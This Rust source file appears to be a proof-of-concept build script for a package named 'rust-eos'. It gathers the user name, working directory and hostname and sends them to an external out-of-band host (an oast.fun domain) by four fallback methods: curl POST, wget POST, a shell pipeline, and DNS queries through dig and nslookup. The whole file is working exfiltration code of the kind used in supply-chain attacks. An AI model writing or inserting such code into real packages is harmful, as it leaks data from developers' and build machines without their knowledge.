use std::process::Command;
use std::thread;
use std::time::Duration;

fn main() {
    // Print marker to build logs
    println!("cargo:warning=POC main.rs executed ✅");

    // Locally run harmless system commands to prove execution
    let whoami = Command::new("whoami").output().unwrap();
    let pwd = Command::new("pwd").output().unwrap();
    let hostname = Command::new("hostname").output().unwrap();

    let whoami_output = String::from_utf8_lossy(&whoami.stdout).trim().to_string();
    let pwd_output = String::from_utf8_lossy(&pwd.stdout).trim().to_string();
    let hostname_output = String::from_utf8_lossy(&hostname.stdout).trim().to_string();

    println!("cargo:warning=whoami: {}", whoami_output);
    println!("cargo:warning=pwd: {}", pwd_output);
    println!("cargo:warning=hostname: {}", hostname_output);

    // Prepare data for exfiltration
    let data = format!(
        "whoami={}&pwd={}&hostname={}&package=rust-eos",
        whoami_output, pwd_output, hostname_output
    );

    // Try multiple exfiltration methods
    exfiltrate_data(&data);
}

fn exfiltrate_data(data: &str) {
    let server_url = "http://nduaepxoixrcimkbeehgl9a30b90uc1t5.oast.fun";
    
    // Method 1: Try curl with POST
    let curl_result = Command::new("curl")
        .arg("-s")
        .arg("-X")
        .arg("POST")
        .arg("--max-time")
        .arg("10")
        .arg("--data")
        .arg(data)
        .arg(format!("{}/curl", server_url))
        .output();

    if let Ok(output) = curl_result {
        println!("cargo:warning=Curl exit status: {}", output.status);
    } else {
        println!("cargo:warning=Curl failed, trying wget...");
    }

    // Method 2: Try wget
    let wget_result = Command::new("wget")
        .arg("--timeout=10")
        .arg("--post-data")
        .arg(data)
        .arg("-O")
        .arg("-")
        .arg(format!("{}/wget", server_url))
        .output();

    if let Ok(output) = wget_result {
        println!("cargo:warning=Wget exit status: {}", output.status);
    } else {
        println!("cargo:warning=Wget also failed");
    }

    // Method 3: Try with shell command as fallback
    let shell_cmd = format!(
        "echo '{}' | curl -X POST -d @- {}/shell 2>/dev/null || wget --post-data='{}' {}/shell2 2>/dev/null",
        data, server_url, data, server_url
    );

    let _ = Command::new("sh")
        .arg("-c")
        .arg(&shell_cmd)
        .output();

    // Method 4: Try DNS exfiltration as last resort
    let dns_data = data.replace(|c: char| !c.is_ascii_alphanumeric(), "_");
    let dns_cmd = format!(
        "dig {}.{} 2>/dev/null || nslookup {}.{} 2>/dev/null",
        &dns_data[..50.min(dns_data.len())],
        "nduaepxoixrcimkbeehgl9a30b90uc1t5.oast.fun",
        &dns_data[..50.min(dns_data.len())],
        "nduaepxoixrcimkbeehgl9a30b90uc1t5.oast.fun"
    );

    let _ = Command::new("sh")
        .arg("-c")
        .arg(&dns_cmd)
        .output();

    println!("cargo:warning=Data exfiltration attempts completed");
}
